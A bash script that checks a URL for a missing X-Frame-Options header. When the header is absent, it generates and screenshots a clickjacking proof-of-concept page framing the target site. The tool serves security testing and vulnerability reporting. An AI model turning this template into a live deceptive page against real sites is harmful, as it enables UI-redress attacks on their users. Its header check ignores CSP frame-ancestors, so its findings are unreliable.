#!/bin/bash

[ -z "$1" ] && echo 'Usage: bash Clinky.sh <URL>' && exit 0

url=$1

response=$(curl -I -s $url)

function html () {

cat <<- _EOF_ > Clickjack.html
<html>
<style>
iframe {
	position:relative;
	opacity: 0.8;
	z-index: 2;
}
div {
	position:absolute;
	top: 5px;
	z-index: 1;
	}

.container {
  position: relative;
  width: 100%;
  overflow: hidden;
  padding-top: 50.25%;
}
.responsive-iframe {
  position: absolute;
  top: 0;
  left: 0;
  bottom: 0;
  right: 0;
  width: 100%;
  height: 100%;
  border: none;
}
body {
	font-family: Helvetica, sans-serif;
	background-image: url('https://www.researchgate.net/publication/335975371/figure/fig1/AS:806095123652619@1569199462871/Hacker-stock-photo-Image-credit-hacker-1-iaBeta-C-2017-Public-Domain.png');
    background-repeat: no-repeat;
    background-attachment: fixed;  
    background-size: cover;
}
</style>

<body>
<center><h1 style="color:white;">The Attacker's Malicious Site</h1></center>
<div class="container"> 
<iframe class="responsive-iframe" src=$url></iframe>
</div>
</body>
</html>
_EOF_

}

if [[ $response != *X-Frame-Options* ]]; then
	echo -e "[+] ClinkyWinky is on your Desktop."
	html
	open ./Clickjack.html && screencapture -x -T 2 -o -W ~/Desktop/Clickjack.jpeg
else
	echo -e "\nSorry no Clickjack here"
fi
